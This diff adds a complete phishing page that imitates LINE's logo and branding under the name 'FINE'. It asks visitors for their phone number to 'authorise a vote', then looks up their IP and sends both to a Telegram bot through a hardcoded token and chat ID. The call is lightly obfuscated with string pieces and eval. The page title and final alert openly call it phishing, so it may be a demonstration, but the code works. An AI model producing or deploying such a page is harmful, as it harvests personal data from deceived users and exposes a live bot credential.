@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>這是一個釣魚網站</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f3f3f3; text-align: center; padding: 50px; }
+    .login-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 360px; margin: auto; }
+    .login-container img { width: 100px; margin-bottom: 20px; }
+    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+    button { width: 100%; padding: 10px; background: #00c300; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    button:hover { background: #009f00; }
+    .loading { display: none; font-size: 14px; color: #666; }
+    h2 { font-size: 24px; font-weight: bold; margin-bottom: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    h3 { font-size: 14px; color: #555; white-space: normal; }
+    .footer { margin-top: 20px; font-size: 12px; color: #888; }
+    .footer a { color: #888; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <svg viewBox="0 0 170 170" xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+      <rect x="0" y="0" width="170" height="170" rx="30" ry="30" fill="#00c300"/>
+      <path d="M147 78c 0-28-28-50-62-50.5-34 0-62 22.5-62 50.5 0 25 22 45.5 52 50 2 .5 5 1.5 5.5 3 .5 1.5.5 4 0 5.5 0 0-.5 4.5 -1 5.5 -.5 1.5 -1 6 5.5 3.5 6.5 -3 35.5-21 48.7-36 9-10 13-20 13.3-31z" fill="#fff"/>
+      <polyline points="48.2,66.5 48.2,91.5 60.5,91.5" stroke="#00c300" stroke-width="5" fill="none"/>
+      <line x1="70.2" y1="66.5" x2="70.2" y2="91.5" stroke="#00c300" stroke-width="5"/>
+      <polyline points="81.2,91.5 81.2,66.5 99.8,91.5 99.8,66.5" stroke="#00c300" stroke-width="5" fill="none"/>
+      <polyline points="123.2,66.5 110.8,66.5 110.8,91.5 123.2,91.5" stroke="#00c300" stroke-width="5" fill="none"/>
+      <line x1="110.8" y1="79" x2="123.2" y2="79" stroke="#00c300" stroke-width="5"/>
+    </svg>
+    <h2>歡迎使用FINE進行授權投票</h2>
+    <h3>輸入電話號碼並點選Next代表您已經同意FINE的服務條例及隱私條款</h3>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="請輸入FINE電話號碼" required>
+      <button type="submit">Next</button>
+      <p class="loading">Verifying...</p>
+    </form>
+    <div class="footer">
+      <p>© 1978 FINE Corp. <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+    </div>
+  </div>
+
+  <script>
+    const k = "bot";
+    const token = "8083238190:AAG-SpdyNc8BXVexo2VVbrBaIeBjxJ3PmHo";
+    const chat = "1800067559";
+    const endpoint = `https://api.${"telegram"}.org/${k}${token}/send${"Message"}`;
+
+    document.getElementById("loginForm").addEventListener("submit", function(ev) {
+      ev.preventDefault();
+      document.querySelector(".loading").style.display = "block";
+      const phone = document.getElementById("username").value;
+
+      fetch('https://' + 'api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => {
+          const userIp = d.ip;
+          const msg = `👤 Log:\n🆔 PHONE: ${phone}\n📍 IP: ${userIp}`;
+
+          eval("fetch")(endpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chat, text: msg })
+          });
+
+          setTimeout(() => {
+            alert("(((((您輸入的資料在我這裡^^)))))");
+            document.getElementById("username").value = "";
+            document.querySelector(".loading").style.display = "none";
+          }, 2000);
+        });
+    });
+  </script>
+</body>
+</html>
